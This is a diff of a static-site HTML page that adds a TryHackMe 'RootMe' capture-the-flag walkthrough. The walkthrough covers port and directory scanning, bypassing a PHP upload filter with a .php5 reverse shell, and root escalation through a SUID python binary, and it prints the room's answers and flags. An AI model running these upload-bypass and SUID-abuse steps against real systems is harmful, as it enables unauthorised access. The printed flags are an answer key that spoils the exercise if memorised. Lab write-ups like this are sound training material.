@@ -23,7 +23,7 @@
     
     
       
-        <title>Summary write ups (easy difficulty) - Offense, Defense, and Everything Between</title>
+        <title>RootMe - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#rootme" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Summary write ups (easy difficulty)
+              RootMe
             
           </span>
         </div>
@@ -607,6 +612,99 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,24 +719,189 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:suid-abuse" class="md-tag">suid-abuse</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
 
 
-  <h1>Summary write ups (easy difficulty)</h1>
 
+<h1 id="rootme">RootMe</h1>
+<p><img alt="RootMe logo" src="../logos/rootme_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/rrootme">RootMe</a>  </p>
+<h2 id="description">Description</h2>
+<p>"A ctf for beginners, can you root me?"</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 72:38:39:73:e0:4b:e8:bd:b9:19:0d:66:17:7b:66:34 (RSA)
+|   256 43:a2:24:5d:81:e9:93:5d:af:37:f3:af:09:29:e0:be (ECDSA)
+|_  256 44:ec:07:df:2d:94:b8:86:b3:5b:84:45:df:29:4b:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: HackIT - Home
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
+Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<details class="success">
+<summary>Scan the machine, how many ports are open?</summary>
+<p>2</p>
+</details>
+<details class="success">
+<summary>What version of Apache is running?</summary>
+<p>2.4.41</p>
+</details>
+<details class="success">
+<summary>What service is running on port 22?</summary>
+<p>SSH</p>
+</details>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
 <ul>
-<li><a href="../brooklyn_nine_nine/">Brooklyn Nine Nine</a>  </li>
-<li><a href="../smag_grotto/">Smag Grotto</a>  </li>
-<li><a href="../bounty_hunter/">Bounty Hunter</a>  </li>
-<li><a href="../easy_peasy/">Easy Peasy</a></li>
-<li><a href="../gamingserver/">GamingServer</a></li>
-<li><a href="../rootme/">RootMe</a></li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li>Nothing interesting in the source code  </li>
+<li><code>ffuf</code> scan reveals <code>/uploads</code> directory: no contents  </li>
+<li><code>ffuf</code> scan reveals <code>/css</code> directory: no interesting contents  </li>
+<li><code>ffuf</code> scan reveals <code>/js</code> directory: no interesting contents  </li>
+<li><code>ffuf</code> scan reveals <code>/panel</code> directory: nothing interesting in the source code; page reveals POST form for uploading files  </li>
+<li>Uploading test document shows file saved with original file name in <code>/uploads</code> directory  </li>
 </ul>
+<details class="success">
+<summary>What is the hidden directory?</summary>
+<p>/panel/</p>
+</details>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit OpenSSH 8.2p1  # No results
+searchsploit httpd 2.4.41   # Only result: DoS
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a><br />
+<em>Upload fails - "PHP files are forbidden"</em><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Upload php-reverse-shell as .php5 file<br />
+<em>Upload succeeds and executes as a shell on navigating through <code>/uploads</code> directory with <code>nc</code> listener initiated on attacker machine</em>  </p>
+<div class="highlight"><pre><span></span><code>$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+www-data@ip-10-130-158-241:/$ find / -name user.txt 2&gt;/dev/null
+find / -name user.txt 2&gt;/dev/null
+/var/www/user.txt
+www-data@ip-10-130-158-241:/$ cat /www/user.txt
+</code></pre></div>
+<details class="success">
+<summary>user.txt</summary>
+<p>THM{y0u_g0t_a_sh3ll}</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><pre><span></span><code>www-data@ip-10-130-158-241:/$ find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -4000 -type f 2&gt;/dev/null
+# &lt;OMITTED FOR BREVITY&gt;
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+# &lt;OMITTED FOR BREVITY&gt;
+</code></pre></div>
+<details class="success">
+<summary>Search for files with SUID permission, which file is weird?</summary>
+<p>/usr/bin/python</p>
+</details>
+<p><a href="https://gtfobins.org/gtfobins/python/">GTFObins for <code>python</code></a>  </p>
+<div class="highlight"><pre><span></span><code>www-data@ip-10-130-158-241:/$ python2.7 -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;
+&lt;2.7 -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;
+root: ls -al /root
+ls -al /root
+total 44
+drwx------  7 root root 4096 Aug 10  2025 .
+drwxr-xr-x 24 root root 4096 Apr 27 20:00 ..
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Aug  4  2020 .cache
+drwx------  3 root root 4096 Aug  4  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Aug  4  2020 .local
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+drwx------  2 root root 4096 Aug 10  2025 .ssh
+-rw-------  1 root root 2122 Aug 10  2025 .viminfo
+-rw-r--r--  1 root root   26 Aug  4  2020 root.txt
+drwx------  3 root root 4096 Aug 10  2025 snap
+root: cat /root/root.txt
+</code></pre></div>
+<details class="success">
+<summary>root.txt</summary>
+<p>THM{pr1v1l3g3_3sc4l4t10n}</p>
+</details>
+<p><strong>Date completed:</strong> 27/04/26<br />
+<strong>Date published:</strong> 27/04/26</p>
 
 
 
 
 
 
+
+  
+  
 
 
 
